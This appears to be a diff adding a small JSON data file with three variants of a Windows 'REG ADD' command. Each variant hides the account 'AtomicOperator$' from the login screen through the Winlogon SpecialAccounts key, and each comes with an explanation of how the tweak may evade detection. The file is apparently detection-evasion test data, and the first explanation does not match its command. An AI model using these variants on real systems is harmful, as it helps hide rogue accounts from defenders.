@@ -1,0 +1,14 @@
+[
+  {
+    "output": "REG ADD HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist /v AtomicOperator$ /t REG_DWORD /d 0",
+    "explanation": "Replaced quotes with double backslashes to bypass detection while maintaining the same functionality."
+  },
+  {
+    "output": "REG ADD HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist /v AtomicOperator$ /t REG_DWORD /d 00",
+    "explanation": "Changed '/d 0' to '/d 00' which is equivalent in the context of a DWORD value and may bypass detection."
+  },
+  {
+    "output": "REG ADD HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist /v AtomicOperator$ /t REG_DWORD /d 0 /f",
+    "explanation": "Added '/f' to force the operation, which is optional but does not affect the core detection logic and may help evade pattern-based detection."
+  }
+]
